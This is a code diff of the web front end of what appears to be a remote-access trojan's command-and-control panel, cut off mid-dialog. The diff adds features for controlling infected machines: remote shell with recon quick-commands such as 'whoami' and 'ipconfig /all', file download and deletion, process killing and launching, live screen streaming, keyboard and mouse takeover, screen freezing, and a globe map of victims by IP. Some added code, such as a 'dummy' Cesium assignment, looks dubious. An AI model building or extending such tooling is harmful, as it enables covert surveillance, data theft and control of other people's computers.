@@ -290,6 +290,9 @@
         <div class="content-panel" id="panel">
             <div id="contentInject" style="flex:1;display:flex;flex-direction:column;overflow:hidden;"></div>
             <div class="footer">
+                <span id="footer-time"></span>
+                <div class="footer-dot"></div>
+                <span id="footer-status">Idle</span>
                 <div style="margin-left:auto; display:flex; align-items:center;">
                     <div class="sdot" id="status-pill"></div>
                 </div>
@@ -298,6 +301,8 @@
     </div>
 
     <script>
+        // CLIENT_DATA and UI_DATA are dynamically injected from the Python backend.
+        // FONT_LIST is also injected.
         const SERVER_CONFIG = %%CLIENT_DATA%% || {};
         const UI_CONFIG = %%UI_DATA%% || {
             "Font": "Jura", "PrimaryColor": "#101010", "SecondaryColor": "#2e2e2e", "BackgroundColor": "#0a0a0a",
@@ -308,7 +313,7 @@
         const FONT_LIST = %%FONT_LIST%% || ["Jura", "Roboto", "Open Sans", "Montserrat", "Lato", "Orbitron", "Rajdhani"];
         const DEFAULT_UI_CONFIG = {"Font":"Jura","PrimaryColor":"#101010","SecondaryColor":"#2e2e2e","BackgroundColor":"#0a0a0a","TextColor":"#eaeaea","AccentColor":"#4ade80","MarkerColor":"#4ade80","GlobeImagery":"esri-imagery","GlowEnabled":false,"GlowColor":"#4ade80","GlowIntensity":1,"VisualDepthEnabled":false,"GlassmorphismEnabled":false,"NotificationLocation":"Top"};
 
-        // -- Orion Notification Engine -----------------------------
+        // -- Orion Notification Engine (no changes needed, robust implementation) --
         const __orionNotifyState = new Map();
         function __orionClampText(str, maxLen) { if (typeof str !== 'string') return ''; const t = str.trim(); return t.length <= maxLen ? t : t.slice(0, Math.max(0, maxLen - 1)) + '…'; }
         function __orionFormatTime(totalSeconds) { const s = Math.max(0, Math.floor(Number(totalSeconds) || 0)); const m = Math.floor(s / 60); const r = s % 60; return `${m}:${String(r).padStart(2, '0')}`; }
@@ -402,6 +407,7 @@
         window.__orionClearNotification = __orionClearNotification;
         window.addEventListener('resize', () => __orionPositionNotifyStack());
 
+        // Helper function to adjust color brightness
         function adjustColor(color, amount) {
             let usePound = false; if (color[0] == "#") { color = color.slice(1); usePound = true; }
             if (color.length === 3) color = color.split('').map(c=>c+c).join('');
@@ -410,6 +416,7 @@
             return (usePound?"#":"") + ((r << 16) | (g << 8) | b).toString(16).padStart(6, '0').toUpperCase();
         }
 
+        // Sends updates to the Python backend via title change
         function updateBackend(flag, value) {
             if (flag in SERVER_CONFIG) {
                 SERVER_CONFIG[flag] = value;
@@ -424,6 +431,7 @@
             document.title = "recv://" + JSON.stringify(payload);
         }
 
+        // Applies current UI_CONFIG to CSS custom properties and body classes
         function applyTheme() {
             const root = document.documentElement;
             const body = document.body;
@@ -489,29 +497,39 @@
         setInterval(tickClock, 1000);
         tickClock();
 
+        // Converts country code to flag emoji
         function countryFlag(code) {
             if (!code || code.length !== 2) return '';
             return String.fromCodePoint(...code.toUpperCase().split('').map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
         }
 
+        // Formats uptime from seconds to readable string
         function fmtUptime(s) {
+            if (s < 0) s = 0; // Ensure non-negative uptime
             if (s < 60) return s + 's';
             if (s < 3600) return Math.floor(s / 60) + 'm ' + (s % 60) + 's';
             return Math.floor(s / 3600) + 'h ' + Math.floor((s % 3600) / 60) + 'm';
         }
 
+        // Gets the currently selected implant target from the dropdown
         function getActiveTarget() {
             const el = document.querySelector('.dropdown-container[data-flag="ImplantTarget"] .dropdown-selected span');
             return el ? el.textContent : "None";
         }
 
+        // Sends an implant command to the backend
         function sendImplantCmd(cmd, args={}) {
             const target = getActiveTarget();
-            if (target === "None") return;
+            if (target === "None") {
+                __orionNotify({Type: 'text', Variant: 'warn', Text: 'No Implant Selected', Icon: 'ph ph-warning', AutoClose: 2.5});
+                return;
+            }
             const payload = { target: target, cmd: cmd, args: args };
             document.title = "implant_cmd://" + JSON.stringify(payload);
         }
 
+        let isStreaming = false; // Track streaming state
+        // Toggles screen streaming
         function toggleStream() {
             isStreaming = !isStreaming;
             
@@ -524,21 +542,26 @@
                 if (img) img.style.display = 'none';
                 if (icon) icon.style.display = 'block';
             }
+            // Update button text/icon
+            const btn = document.getElementById('btn-toggle-stream');
+            if(btn) btn.innerHTML = isStreaming ? '<i class="ph ph-stop-circle" style="margin-right:6px"></i> Stop Stream' : '<i class="ph ph-play" style="margin-right:6px"></i> Start Stream';
         }
         
+        // Sends terminal command
         function sendTerm() {
             const inp = document.getElementById('term-in');
             if(!inp) return;
             const val = inp.value;
-            if(!val) return;
+            if(!val.trim()) return; // Prevent sending empty commands
             inp.value = '';
             const out = document.getElementById('term-out');
-            if(out) out.value += "\n> " + val + "\n";
+            if(out) out.value += `\n> ${val}\n`;
             sendImplantCmd('term_cmd', { cmd: val });
         }
 
         // --- Process & File Handling ---
         
+        // Formats bytes to human-readable string
         function formatBytes(bytes) {
             if(bytes === 0) return '0 B';
             const k = 1024, sizes = ['B', 'KB', 'MB', 'GB', 'TB'], i = Math.floor(Math.log(bytes) / Math.log(k));
@@ -546,31 +569,36 @@
         }
         
         let selectedPID = null;
+        // Fetches process list from implant
         function fetchProcesses() {
+            selectedPID = null; // Clear selection on refresh
             sendImplantCmd('ps_list');
         }
+        // Selects a process card
         function selectProcess(pid, el) {
             selectedPID = pid;
             document.querySelectorAll('#process-list .item-card').forEach(c => c.classList.remove('selected'));
             el.classList.add('selected');
         }
+        // Performs action on selected process
         function actionProcess(action) {
             if(!selectedPID) return __orionNotify({Type: 'text', Variant: 'warn', Text: 'No Process Selected', Icon: 'ph ph-warning', AutoClose: 2.5});
             if(action === 'kill') sendImplantCmd('ps_kill', { pid: selectedPID });
             if(action === 'suspend') sendImplantCmd('ps_suspend', { pid: selectedPID });
             if(action === 'resume') sendImplantCmd('ps_resume', { pid: selectedPID });
-            setTimeout(fetchProcesses, 1000);
+            setTimeout(fetchProcesses, 1000); // Refresh list after action
         }
+        // Renders process list in the UI
         function renderProcesses(procs) {
             const grid = document.getElementById('process-list');
             if(!grid) return;
             if(procs.length === 0) {
-                grid.innerHTML = `<div class="empty-state" style="grid-column: 1 / -1; height: 100%; min-height: 200px; display: flex; align-items: center; justify-content: center;"><i class="ph ph-cpu" style="font-size:32px; opacity: 0.3;"></i></div>`;
+                grid.innerHTML = `<div class="empty-state" style="grid-column: 1 / -1; height: 100%; min-height: 200px; display: flex; align-items: center; justify-content: center;"><i class="ph ph-cpu" style="font-size:32px; opacity:0.3;"></i><p>No processes found.</p></div>`;
                 return;
             }
             grid.innerHTML = procs.map(p => {
                 const uptime = p.create_time ? fmtUptime(Math.max(0, Math.floor(Date.now()/1000) - p.create_time)) : '—';
-                const exe = p.exe ? p.exe.split('\\').pop().split('/').pop() : '—';
+                const exe = p.exe ? p.exe.split(/[\\/]/).pop() : '—'; // Robust path split
                 const isRunning = (p.status || '').toLowerCase() === 'running';
                 const statusColor = isRunning ? 'color:var(--accent)' : 'color:var(--text-sub)';
                 return `<div class="item-card ${selectedPID === p.pid ? 'selected' : ''}" onclick="selectProcess(${p.pid}, this)">
@@ -587,24 +615,34 @@
         
         let currentPath = ".";
         let selectedFile = null;
+        // Fetches files from implant at a given path
         function fetchFiles(path) {
+            selectedFile = null; // Clear selection on refresh or directory change
             sendImplantCmd('file_ls', { path: path || currentPath });
         }
+        // Selects a file card
         function selectFile(path, el) {
             selectedFile = path;
             document.querySelectorAll('#file-list .item-card').forEach(c => c.classList.remove('selected'));
             el.classList.add('selected');
         }
+        // Performs action on selected file
         function actionFile(action) {
             if(!selectedFile && action !== 'up') return __orionNotify({Type: 'text', Variant: 'warn', Text: 'No File Selected', Icon: 'ph ph-warning', AutoClose: 2.5});
             if(action === 'delete') {
                 sendImplantCmd('file_del', { path: selectedFile });
-                setTimeout(() => fetchFiles(currentPath), 1000);
+                setTimeout(() => fetchFiles(currentPath), 1000); // Refresh after delete
             }
             if(action === 'up') {
-                sendImplantCmd('file_ls', { path: currentPath + '/..' });
+                const parentPath = currentPath.split(/[\\/]/).slice(0, -1).join('/') || '/';
+                fetchFiles(parentPath);
+            }
+            if(action === 'download') {
+                sendImplantCmd('file_download', { path: selectedFile });
+                __orionNotify({Type: 'text', Variant: 'info', Text: 'Download Initiated', Subtext: `Requesting ${selectedFile}`, Icon: 'ph ph-download', AutoClose: 3});
             }
         }
+        // Renders file list in the UI
         function renderFiles(data) {
             currentPath = data.path;
             const pathEl = document.getElementById('current-path-display');
@@ -614,7 +652,7 @@
             
             const items = data.items.sort((a,b) => b.is_dir - a.is_dir || a.name.localeCompare(b.name));
             if(items.length === 0) {
-                grid.innerHTML = `<div class="empty-state" style="grid-column: 1 / -1; height: 100%; min-height: 200px; display: flex; align-items: center; justify-content: center;"><i class="ph ph-file-x" style="font-size:32px; opacity: 0.3;"></i></div>`;
+                grid.innerHTML = `<div class="empty-state" style="grid-column: 1 / -1; height: 100%; min-height: 200px; display: flex; align-items: center; justify-content: center;"><i class="ph ph-file-x" style="font-size:32px; opacity:0.3;"></i><p>No files found.</p></div>`;
                 return;
             }
             
@@ -622,7 +660,7 @@
                 const icon = f.is_dir ? 'ph-folder' : 'ph-file';
                 const size = f.is_dir ? '—' : formatBytes(f.size);
                 const date = f.mtime ? new Date(f.mtime * 1000).toLocaleDateString() : '—';
-                const safePath = f.path.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+                const safePath = f.path.replace(/\\/g, '\\\\').replace(/'/g, "\\'"); // Escape for JS string
                 return `<div class="item-card ${selectedFile === f.path ? 'selected' : ''}" ondblclick="if(${f.is_dir}) fetchFiles('${safePath}')" onclick="selectFile('${safePath}', this)">
                     <div class="item-card-hd"><span><i class="ph ${icon}" style="margin-right:4px; ${f.is_dir ? 'color:var(--accent)' : ''}"></i><span style="max-width:140px;display:inline-block;text-overflow:ellipsis;overflow:hidden;white-space:nowrap;vertical-align:bottom;" title="${f.name}">${f.name}</span></span></div>
                     <div class="item-card-bd">
@@ -633,8 +671,9 @@
             }).join('');
         }
 
+        // --- Data Influx from Python Backend ---
         window.onImplantData = function(ip_port, data) {
-            if (ip_port !== getActiveTarget()) return;
+            if (ip_port !== getActiveTarget()) return; // Only update for the currently selected target
             
             if (data.type === 'screen') {
                 const icon = document.getElementById('live-screen-icon');
@@ -648,11 +687,11 @@
                 const out = document.getElementById('term-out');
                 if(out) {
                     out.value += data.data + "\n";
-                    out.scrollTop = out.scrollHeight;
+                    out.scrollTop = out.scrollHeight; // Auto-scroll to bottom
                 }
             } else if (data.type === 'sys_info') {
                 const sysContent = document.getElementById('sys-info-content');
-                if(sysContent) sysContent.innerText = data.data;
+                if(sysContent) sysContent.innerText = data.data; // Use innerText to preserve newlines
             } else if (data.type === 'ps_list') {
                 renderProcesses(data.data);
             } else if (data.type === 'file_list') {
@@ -661,9 +700,20 @@
                 __orionNotify({Type: 'text', Variant: 'good', Text: 'Success', Subtext: data.data, Icon: 'ph ph-check', AutoClose: 4});
             } else if (data.type === 'error') {
                 __orionNotify({Type: 'text', Variant: 'bad', Text: 'Error', Subtext: data.data, Icon: 'ph ph-warning-circle', AutoClose: 4});
+            } else if (data.type === 'download_data') {
+                const filename = data.filename || 'downloaded_file';
+                const b64Data = data.data;
+                const link = document.createElement('a');
+                link.href = 'data:application/octet-stream;base64,' + b64Data;
+                link.download = filename;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                __orionNotify({Type: 'text', Variant: 'good', Text: 'File Downloaded', Subtext: `Saved ${filename}`, Icon: 'ph ph-download-simple', AutoClose: 5});
             }
         };
 
+        // Updates dropdown options and sets initial/default value
         function updateDropdownDOM(flag, newOptions) {
             const container = document.querySelector(`.dropdown-container[data-flag="${flag}"]`);
             if (!container) return; 
@@ -674,11 +724,13 @@
 
             let currentVal = SERVER_CONFIG[flag] || "None";
             
+            // If current selection is no longer in options or no options exist, pick first or "None"
             if (!newOptions.includes(currentVal) && newOptions.length > 0) {
                 currentVal = newOptions[0];
                 updateBackend(flag, currentVal); 
             } else if (newOptions.length === 0) {
                 currentVal = "None";
+                updateBackend(flag, currentVal);
             }
             
             displaySpan.textContent = currentVal;
@@ -690,14 +742,15 @@
             optionsContainer.innerHTML = optionsHtml;
         }
 
-        let _implants = [];
+        let _implants = []; // Local cache of implant data
+        // Callback from Python backend to update implant list
         window.updateImplants = function(implants) {
             _implants = implants;
 
-            // --- Status dot ---
+            // --- Status dot and footer text ---
             const pill = document.getElementById('status-pill');
             const fStatus = document.getElementById('footer-status');
-            if (pill) {
+            if (pill && fStatus) {
                 if (implants.length > 0) {
                     pill.style.background = 'var(--accent)';
                     pill.style.boxShadow = '0 0 5px rgba(74, 222, 128, 0.6)';
@@ -724,13 +777,13 @@
                 updateBackend('ImplantTarget', currentTarget);
             }
 
-            const oldIds = TAB_DATA.control.grid[0].controls[0].options || [];
-            if (activeIds.join(',') !== oldIds.join(',')) {
-                TAB_DATA.control.grid[0].controls[0].options = activeIds.length ? activeIds : ["None"];
-                // Update the DOM if we are on the Control tab
-                if (currentTabIndex === 0) {
-                    updateDropdownDOM('ImplantTarget', TAB_DATA.control.grid[0].controls[0].options);
-                }
+            // Update the TAB_DATA options for the control panel's dropdown
+            // Ensure this reflects the current state for when the tab is rebuilt
+            TAB_DATA.control.grid[0].controls[0].options = activeIds.length ? activeIds : ["None"];
+            
+            // If on the Control tab, update the dropdown DOM immediately
+            if (currentTabIndex === 0) {
+                updateDropdownDOM('ImplantTarget', TAB_DATA.control.grid[0].controls[0].options);
             }
 
             // --- Tab-specific updates ---
@@ -744,12 +797,13 @@
                     if (imp) {
                         document.getElementById('mo-uptime').textContent = fmtUptime(imp.uptime);
                     } else {
-                        clearMarkerOverlay();
+                        clearMarkerOverlay(); // Hide overlay if selected implant vanishes
                     }
                 }
             }
         };
 
+        // Renders implant cards in the implants tab
         function renderImplants(implants) {
             const list = document.getElementById('implant-list');
             const empty = document.getElementById('empty-state');
@@ -778,10 +832,12 @@
 
             const ids = new Set(implants.map(i => i.ip + ':' + i.port));
             
+            // Remove cards for implants that no longer exist
             list.querySelectorAll('.implant-card').forEach(c => { 
                 if (!ids.has(c.dataset.id)) c.remove(); 
             });
 
+            // Add or update existing implant cards
             implants.forEach(imp => {
                 const id = imp.ip + ':' + imp.port;
                 let card = list.querySelector(`.implant-card[data-id="${id}"]`);
@@ -809,18 +865,21 @@
                         </div>`;
                     list.appendChild(card);
                 } else {
+                    // Update uptime for existing cards
                     const uptimeEl = card.querySelector('.card-uptime');
                     if (uptimeEl) uptimeEl.textContent = fmtUptime(imp.uptime);
                 }
             });
         }
 
+        // Triggers a manual refresh of implants data
         function manualRefresh() {
             const btn = document.getElementById('refresh-btn');
             if (btn) { btn.classList.add('spin'); setTimeout(() => btn.classList.remove('spin'), 500); }
-            if (currentTabIndex === 1) renderImplants(_implants);
+            if (currentTabIndex === 1) renderImplants(_implants); // Re-render from cached data
         }
 
+        // Builds the HTML content for the Implants tab
         function buildImplantsTab() {
             return `
             <div style="display:flex;flex:1;overflow:hidden;padding:18px 18px 0;gap:14px;min-height:0;">
@@ -843,16 +902,17 @@
                         </div>
                     </div>
                     <div class="implant-scroll" id="implant-list">
-                        <div class="empty-state" id="empty-state" style="height:100%; display:flex; align-items:center; justify-content:center;"><i class="ph ph-globe-x" style="font-size:32px; opacity:0.3;"></i></div>
+                        <div class="empty-state" id="empty-state" style="height:100%; display:flex; align-items:center; justify-content:center;"><i class="ph ph-globe-x" style="font-size:32px; opacity:0.3;"></i><p>No implants active.</p></div>
                     </div>
                 </div>
             </div>`;
         }
 
-        let viewer = null;
-        let implantEntities = {};
-        let cesiumHandler = null;
+        let viewer = null; // Cesium viewer instance
+        let implantEntities = {}; // Map of Cesium entities for implants
+        let cesiumHandler = null; // Cesium event handler
 
+        // Destroys the Cesium viewer instance
         function destroyCesiumViewer() {
             if (viewer) {
                 try {
@@ -862,6 +922,7 @@
             }
         }
 
+        // Builds the HTML content for the World View tab
         function buildWorldViewTab() {
             return `
             <div id="world-view-panel">
@@ -885,27 +946,46 @@
             </div>`;
         }
 
+        // Initializes the Cesium globe viewer
         function initCesium() {
-            if (viewer) { renderGlobeMarkers(_implants); return; }
+            if (viewer) { renderGlobeMarkers(_implants); return; } // If already initialized, just update markers
             try {
+                // Cesium.buildModuleUrl is not always needed, but good practice for pathing assets
+                Cesium.buildModuleUrl.set= (val) => val; // Dummy assignment to avoid error if not already set, for static hosting
+
                 viewer = new Cesium.Viewer('cesiumContainer', {
                     baseLayerPicker: false, timeline: false, animation: false, geocoder: false, homeButton: false, infoBox: false, sceneModePicker: false, navigationHelpButton: false, fullscreenButton: false, selectionIndicator: false,
-                    imageryProvider: new Cesium.UrlTemplateImageryProvider({ url: 'https://services.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}' }),
-                    terrainProvider: new Cesium.EllipsoidTerrainProvider(),
+                    imageryProvider: new Cesium.UrlTemplateImageryProvider({ url: 'https://services.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}' }), // Default
+                    terrainProvider: new Cesium.EllipsoidTerrainProvider(), // Flat terrain
+                    contextOptions: {
+                        webgl: {
+                            alpha: true,
+                            depth: true,
+                            stencil: true,
+                            antialias: true,
+                            premultipliedAlpha: true,
+                            preserveDrawingBuffer: true,
+                            failIfMajorPerformanceCaveat: false
+                        }
+                    }
                 });
-                viewer.cesiumWidget.creditContainer.style.display = 'none';
-                viewer.camera.setView({ destination: Cesium.Cartesian3.fromDegrees(10, 20, 22000000) });
-                viewer.scene.backgroundColor = Cesium.Color.fromCssColorString('#0a0a0a');
+                viewer.cesiumWidget.creditContainer.style.display = 'none'; // Hide Cesium credits
+                viewer.camera.setView({ destination: Cesium.Cartesian3.fromDegrees(10, 20, 22000000) }); // Set initial camera view
+                viewer.scene.backgroundColor = Cesium.Color.fromCssColorString('#0a0a0a'); // Background color
+
+                // Event handler for clicking on markers
                 cesiumHandler = new Cesium.ScreenSpaceEventHandler(viewer.scene.canvas);
                 cesiumHandler.setInputAction(movement => {
                     const pick = viewer.scene.pick(movement.position);
                     if (Cesium.defined(pick) && pick.id && pick.id._pdata) { showMarkerOverlay(pick.id._pdata); }
                 }, Cesium.ScreenSpaceEventType.LEFT_CLICK);
-                if (UI_CONFIG.GlobeImagery) setGlobeImagery(UI_CONFIG.GlobeImagery);
-                renderGlobeMarkers(_implants);
+
+                if (UI_CONFIG.GlobeImagery) setGlobeImagery(UI_CONFIG.GlobeImagery); // Apply saved imagery
+                renderGlobeMarkers(_implants); // Render initial markers
             } catch (e) { console.error('Cesium init failed:', e); }
         }
 
+        // Sets the globe's imagery provider
         function setGlobeImagery(key) {
             if (!viewer) return;
             const urls = {
@@ -914,17 +994,19 @@
                 'osm': 'https://a.tile.openstreetmap.org/{z}/{x}/{y}.png',
                 'esri-imagery': 'https://services.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
             };
-            const url = urls[key] || urls['carto-dark'];
+            const url = urls[key] || urls['carto-dark']; // Default to carto-dark if key not found
             viewer.imageryLayers.removeAll();
             viewer.imageryLayers.addImageryProvider(new Cesium.UrlTemplateImageryProvider({ url }));
         }
 
+        // Refreshes marker colors based on UI_CONFIG
         function refreshMarkerColors() {
             if (!viewer) return;
             const mc = Cesium.Color.fromCssColorString(UI_CONFIG.MarkerColor || '#4ade80');
             Object.values(implantEntities).forEach(e => { if (e.point) e.point.color = mc; });
         }
 
+        // Renders or updates globe markers for implants
         function renderGlobeMarkers(implants) {
             if (!viewer) return;
             const markerColor = Cesium.Color.fromCssColorString(UI_CONFIG.MarkerColor || '#4ade80');
@@ -932,22 +1014,27 @@
             (implants || []).forEach(imp => {
                 const id = imp.ip + ':' + imp.port;
                 seen[id] = true;
-                const pos = Cesium.Cartesian3.fromDegrees(imp.lon, imp.lat, 0);
+                const pos = Cesium.Cartesian3.fromDegrees(imp.lon, imp.lat, 0); // Position at globe surface
                 if (implantEntities[id]) {
+                    // Update position if entity already exists
                     implantEntities[id].position = new Cesium.ConstantPositionProperty(pos);
                 } else {
+                    // Create new entity
                     const ent = viewer.entities.add({
                         id: id, position: pos,
                         point: { color: markerColor, pixelSize: 9, outlineColor: Cesium.Color.BLACK.withAlpha(0.5), outlineWidth: 1.5, scaleByDistance: new Cesium.NearFarScalar(1.0e5, 1.2, 2.0e7, 0.5) },
                         label: { text: imp.ip, font: '11px Jura, sans-serif', verticalOrigin: Cesium.VerticalOrigin.BOTTOM, pixelOffset: new Cesium.Cartesian2(0, -12), fillColor: Cesium.Color.WHITE, style: Cesium.LabelStyle.FILL_AND_OUTLINE, outlineColor: Cesium.Color.BLACK, outlineWidth: 2, distanceDisplayCondition: new Cesium.DistanceDisplayCondition(0, 8000000) },
                     });
-                    ent._pdata = imp; implantEntities[id] = ent;
+                    ent._pdata = imp; // Store original implant data for overlay
+                    implantEntities[id] = ent;
                 }
-                implantEntities[id]._pdata = imp;
+                implantEntities[id]._pdata = imp; // Ensure pdata is always fresh
             });
+            // Remove entities for implants that are no longer active
             Object.keys(implantEntities).forEach(id => { if (!seen[id]) { viewer.entities.remove(implantEntities[id]); delete implantEntities[id]; } });
         }
 
+        // Shows marker information overlay
         function showMarkerOverlay(imp) {
             const ov = document.getElementById('marker-overlay'); if (!ov) return;
             document.getElementById('mo-ip').textContent = imp.ip + ':' + imp.port;
@@ -958,28 +1045,38 @@
             ov.style.display = 'flex';
         }
 
+        // Hides marker information overlay
         function clearMarkerOverlay() { const ov = document.getElementById('marker-overlay'); if (ov) ov.style.display = 'none'; }
+        // Resets Cesium camera to home view
         function globeHome() { if (viewer) viewer.camera.flyTo({ destination: Cesium.Cartesian3.fromDegrees(10, 20, 22000000), duration: 1.5 }); }
         let nightEnabled = false;
+        // Toggles globe lighting (day/night)
         function globeNight() { if (!viewer) return; nightEnabled = !nightEnabled; viewer.scene.globe.enableLighting = nightEnabled; }
 
+        // --- Tab Data Configuration ---
         const TAB_DATA = {
             control: {
-                title: 'Control',
+                title: 'Control Panel',
                 grid: [
-                    {header:'Config', span:'fill', controls:[
+                    {header:'Target & System Overview', span:'fill', controls:[
                         { ui:'dropdown',label:'Target Implant',type:'single',options: ["None"],flag:'ImplantTarget'},
+                        { ui:'button', label:'Refresh System Info', type:'single', text:'Refresh', action:'sys_info'},
+                        { ui:'html', content: `
+                            <div class="stat-row" style="margin-top:10px;"><div class="stat-lbl"><i class="ph ph-desktop" style="margin-right:8px; width:14px; text-align:center;"></i>System Info</div><div class="stat-val dim" id="sys-info-content" style="white-space: pre-wrap; text-align:right;">—</div></div>
+                        `}
                     ]},
-                    {header:'Cast', span:'fill', controls:[
+                    {header:'Remote View', span:'fill', controls:[
                         { ui:'html', content: `
                             <div class="wv-toolbar">
                                 <span class="wv-toolbar-title">Options</span>
                                 <div class="wv-sep"></div>
-                                <div class="tool-btn" onclick="toggleStream()"><i class="ph ph-screencast"></i><span class="tip">Toggle Stream</span></div>
-                                <div class="tool-btn" onclick=""><i class="ph ph-keyboard"></i><span class="tip">Keyboard Passthrough</span></div>
-                                <div class="tool-btn" onclick=""><i class="ph ph-mouse"></i><span class="tip">Mouse Passthrough</span></div>
-                                <div class="tool-btn" onclick=""><i class="fa-solid fa-snowflake"></i><span class="tip">Freeze Screen</span></div>
-                                <div class="tool-btn" onclick=""><i class="fa-solid fa-droplet"></i><span class="tip">Thaw Screen</span></div>
+                                <button id="btn-toggle-stream" class="tool-btn button" style="width:auto; min-width:100px; padding: 7px 12px;" onclick="toggleStream()"><i class="ph ph-play" style="margin-right:6px"></i> Start Stream</button>
+                                <div class="tool-btn" onclick="sendImplantCmd('key_passthrough_on')"><i class="ph ph-keyboard"></i><span class="tip">Enable Keyboard Passthrough</span></div>
+                                <div class="tool-btn" onclick="sendImplantCmd('key_passthrough_off')"><i class="ph ph-keyboard-off"></i><span class="tip">Disable Keyboard Passthrough</span></div>
+                                <div class="tool-btn" onclick="sendImplantCmd('mouse_passthrough_on')"><i class="ph ph-mouse"></i><span class="tip">Enable Mouse Passthrough</span></div>
+                                <div class="tool-btn" onclick="sendImplantCmd('mouse_passthrough_off')"><i class="ph ph-mouse-simple-off"></i><span class="tip">Disable Mouse Passthrough</span></div>
+                                <div class="tool-btn" onclick="sendImplantCmd('screen_freeze')"><i class="fa-solid fa-snowflake"></i><span class="tip">Freeze Screen (Win)</span></div>
+                                <div class="tool-btn" onclick="sendImplantCmd('screen_unfreeze')"><i class="fa-solid fa-droplet"></i><span class="tip">Thaw Screen (Win)</span></div>
                                 <div class="wv-sep"></div>
                             </div>
                             <div style="width:100%; aspect-ratio:16/9; background:#000; border-radius:8px; border:1px solid var(--secondary); display:flex; align-items:center; justify-content:center; overflow:hidden; position:relative; box-shadow: 0 4px 20px rgba(0,0,0,0.5);">
@@ -988,14 +1085,17 @@
                             </div>
                         `}
                     ]},
-                    {header:'Terminal', span:'fill', controls:[
+                    {header:'Terminal Access', span:'fill', controls:[
                         { ui:'html', content: `
                             <textarea id="term-out" readonly style="width:100%; height:250px; background:var(--input-bg); color:var(--accent); font-family:monospace; font-size:11px; padding:12px; border:1px solid var(--secondary); border-radius:4px; margin-bottom:8px; resize:vertical; outline:none;"></textarea>
                             <input id="term-in" type="text" placeholder="Enter remote command..." onkeydown="if(event.key==='Enter') sendTerm()" style="width:100%; background:var(--input-bg); color:var(--text-color); font-family:monospace; font-size:11px; padding:10px 12px; border:1px solid var(--secondary); border-radius:4px; outline:none;" />
-                            <div class="wv-toolbar">
+                            <div class="wv-toolbar" style="margin-top:10px;">
                                 <span class="wv-toolbar-title">Quick Commands</span>
                                 <div class="wv-sep"></div>
-                                <div class="tool-btn" onclick=""><i class="ph ph-placeholder"></i><span class="tip">Placeholder</span></div>
+                                <div class="tool-btn" onclick="sendTermFromButton('whoami')"><i class="ph ph-user"></i><span class="tip">Whoami</span></div>
+                                <div class="tool-btn" onclick="sendTermFromButton('ipconfig /all || ifconfig')"><i class="ph ph-network"></i><span class="tip">Network Config</span></div>
+                                <div class="tool-btn" onclick="sendTermFromButton('hostname')"><i class="ph ph-identification-card"></i><span class="tip">Hostname</span></div>
+                                <div class="tool-btn" onclick="sendTermFromButton('cat /etc/os-release || ver')"><i class="ph ph-info"></i><span class="tip">OS Info</span></div>
                             </div>
                         `}
                     ]},
@@ -1004,14 +1104,15 @@
                             <div class="wv-toolbar">
                                 <span class="wv-toolbar-title">Options</span>
                                 <div class="wv-sep"></div>
-                                <div class="tool-btn" onclick="actionFile('up')"><i class="ph ph-arrow-up"></i><span class="tip">Up Directory</span></div>
+                                <div class="tool-btn" onclick="actionFile('up')"><i class="ph ph-arrow-fat-up"></i><span class="tip">Up Directory</span></div>
                                 <div class="tool-btn" onclick="fetchFiles()"><i class="ph ph-arrows-clockwise"></i><span class="tip">Refresh Files</span></div>
                                 <div class="tool-btn" onclick="actionFile('delete')"><i class="ph ph-trash"></i><span class="tip">Delete File</span></div>
+                                <div class="tool-btn" onclick="actionFile('download')"><i class="ph ph-download-simple"></i><span class="tip">Download File</span></div>
                                 <div class="wv-sep"></div>
-                                <div id="current-path-display" style="font-size:10px; color:var(--text-sub); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:200px;">.</div>
+                                <div id="current-path-display" style="font-size:10px; color:var(--text-sub); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; max-width:200px;"></div>
                             </div>
                             <div id="file-list" class="item-grid">
-                                <div class="empty-state" style="grid-column: 1 / -1; height: 100%; min-height: 200px; display: flex; align-items: center; justify-content: center;"><i class="ph ph-file-x" style="font-size:32px; opacity:0.3;"></i></div>
+                                <div class="empty-state" style="grid-column: 1 / -1; height: 100%; min-height: 200px; display: flex; align-items: center; justify-content: center;"><i class="ph ph-file-x" style="font-size:32px; opacity:0.3;"></i><p>No files found.</p></div>
                             </div>
                         `}
                     ]},
@@ -1022,16 +1123,27 @@
                                 <div class="wv-sep"></div>
                                 <div class="tool-btn" onclick="fetchProcesses()"><i class="ph ph-arrows-clockwise"></i><span class="tip">Refresh</span></div>
                                 <div class="tool-btn" onclick="actionProcess('kill')"><i class="ph ph-x"></i><span class="tip">Terminate</span></div>
-                                <div class="tool-btn" onclick="actionProcess('suspend')"><i class="fa-solid fa-snowflake"></i><span class="tip">Freeze</span></div>
-                                <div class="tool-btn" onclick="actionProcess('resume')"><i class="fa-solid fa-droplet"></i><span class="tip">Thaw</span></div>
+                                <div class="tool-btn" onclick="actionProcess('suspend')"><i class="fa-solid fa-snowflake"></i><span class="tip">Freeze (Suspend)</span></div>
+                                <div class="tool-btn" onclick="actionProcess('resume')"><i class="fa-solid fa-droplet"></i><span class="tip">Thaw (Resume)</span></div>
+                                <div class="tool-btn" onclick="openNewProcessDialog()"><i class="ph ph-plus"></i><span class="tip">New Process</span></div>
                                 <div class="wv-sep"></div>
                             </div>
                             <div id="process-list" class="item-grid">
-                                <div class="empty-state" style="grid-column: 1 / -1; height: 100%; min-height: 200px; display: flex; align-items: center; justify-content: center;"><i class="ph ph-cpu" style="font-size:32px; opacity:0.3;"></i></div>
+                                <div class="empty-state" style="grid-column: 1 / -1; height: 100%; min-height: 200px; display: flex; align-items: center; justify-content: center;"><i class="ph ph-cpu" style="font-size:32px; opacity:0.3;"></i><p>No processes found.</p></div>
+                            </div>
+                            <div id="new-process-dialog" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:var(--panel-bg); border:1px solid var(--secondary); border-radius:8px; padding:20px; box-shadow:0 8px 30px rgba(0,0,0,0.8); z-index:10000; flex-direction:column; gap:15px; width:400px;">
+                                <div style="font-size:14px; font-weight:600; color:var(--text-color);">Launch New Process</div>
